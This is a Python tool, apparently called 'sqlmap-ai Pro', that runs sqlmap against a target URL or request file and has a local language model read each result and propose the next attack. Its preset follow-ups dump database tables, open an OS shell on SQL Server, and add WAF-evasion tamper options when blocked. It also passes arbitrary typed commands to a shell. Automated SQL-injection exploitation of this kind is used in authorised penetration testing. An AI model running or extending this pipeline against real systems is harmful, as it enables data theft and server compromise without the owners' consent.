import argparse
import subprocess
import os
from transformers import AutoTokenizer, AutoModelForCausalLM

class LocalLLM:
    def __init__(self, model_name="microsoft/phi-2"):
        print(f"[+] Loading local LLM: {model_name}")
        self.tokenizer = AutoTokenizer.from_pretrained(model_name)
        self.model = AutoModelForCausalLM.from_pretrained(
            model_name, device_map="auto", torch_dtype="auto"
        )
        self.model.eval()

    def generate_response(self, prompt: str, max_tokens=512):
        inputs = self.tokenizer(prompt, return_tensors="pt")
        outputs = self.model.generate(**inputs, max_new_tokens=max_tokens)
        return self.tokenizer.decode(outputs[0], skip_special_tokens=True)

def is_vulnerable(output):
    return "is vulnerable" in output.lower() or "sql injection" in output.lower()

def detect_dbms(output):
    for dbms in ["MySQL", "PostgreSQL", "Oracle", "Microsoft SQL Server", "SQLite", "MariaDB", "DB2"]:
        if dbms.lower() in output.lower():
            return dbms
    return "Unknown"

def next_steps(dbms):
    if dbms == "MySQL":
        return "--dbs --tables --columns"
    elif dbms == "Microsoft SQL Server":
        return "--os-shell"
    elif dbms == "Oracle":
        return "--technique=E --dump-all"
    elif dbms == "PostgreSQL":
        return "--current-user --roles --tables"
    elif dbms == "SQLite":
        return "--schema"
    elif dbms == "MariaDB":
        return "--tables --columns --dump"
    elif dbms == "DB2":
        return "--technique=E --risk=3"
    return "--fingerprint"

def suggest_tamper(log):
    if "403 Forbidden" in log or "blocked by WAF" in log:
        return "--tamper=between,randomcase,charencode"
    elif "redirect" in log:
        return "--tamper=space2comment,unmagicquotes"
    return "--tamper=default"

def run_sqlmap(cmd, label):
    print(f"\n[+] Running: {label}\n$ {cmd}")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(result.stdout)
    return result.stdout

def analyze_with_llm(llm, command, output):
    prompt = f"""You are a cybersecurity AI assistant.

SQLMap just executed this command:
{command}

Here is the output:
{output}

Please:
- Summarize vulnerabilities
- Assess DBMS type
- Suggest the next SQLMap command
"""
    return llm.generate_response(prompt)

def main():
    parser = argparse.ArgumentParser(description="sqlmap-ai Pro (Realtime)")
    parser.add_argument("--url", help="Target URL")
    parser.add_argument("--req", help="Request file")
    parser.add_argument("--local", action="store_true", help="Use local LLM")

    args = parser.parse_args()

    if not args.url and not args.req:
        print("[-] You must provide either --url or --req")
        return

    llm = LocalLLM() if args.local else None  # Placeholder for OpenAIHandler

    if args.req:
        target_cmd = f"sqlmap -r {args.req} --batch --level=2 --risk=2"
    else:
        target_cmd = f"sqlmap -u {args.url} --batch --level=2 --risk=2"

    # Stage 1: Initial Scan
    output = run_sqlmap(target_cmd, "Initial Scan")
    response = analyze_with_llm(llm, target_cmd, output)
    print("\n[AI Analysis]\n", response)

    print("\nDo you want to proceed to the next step? (y/n/custom):")
    choice = input("> ").strip().lower()

    if choice == "n":
        print("[*] Exiting.")
        return
    elif choice.startswith("y"):
        dbms = detect_dbms(output)
        tamper = suggest_tamper(output)
        strategy = next_steps(dbms)
        if args.req:
            next_cmd = f"sqlmap -r {args.req} {strategy} {tamper} --batch"
        else:
            next_cmd = f"sqlmap -u {args.url} {strategy} {tamper} --batch"
    else:
        next_cmd = choice  # Custom command

    # Stage 2: Follow-up Action
    output2 = run_sqlmap(next_cmd, "Next Step")
    response2 = analyze_with_llm(llm, next_cmd, output2)
    print("\n[AI Analysis - Follow-up]\n", response2)

if __name__ == "__main__":
    main()
